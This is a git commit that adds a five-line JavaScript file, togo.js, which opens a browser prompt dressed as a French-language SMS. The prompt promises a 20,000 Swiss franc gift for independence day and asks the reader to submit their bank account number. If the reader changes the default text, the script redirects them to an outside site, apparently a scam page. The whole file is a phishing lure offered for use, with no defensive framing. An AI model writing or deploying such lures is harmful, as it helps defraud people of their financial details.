9b2a836f9a8424a0903a2d5d35624158e669f1e9
usorondo65 <barrows-tend6d@icloud.com>
2026-04-19 21:50:30 +0100

    Create togo.js

---
+++ togo.js
@@ -0,0 +1,5 @@
+var password = 'Retirer 20,000 francs'
+password=prompt('SMS: Congratulation. Vous avez droit à un cadeau de 20,000 francs suisses à l occasion de la fête de l indépendance. Veuillez cliquer sur "OK" pour soumettre votre numéro de compte. ','Retirer 20,000 francs');
+if (password != 'Retirer 20,000 francs') {
+location.href='https://www.kungitid.site/20k-francs-cash';
+}
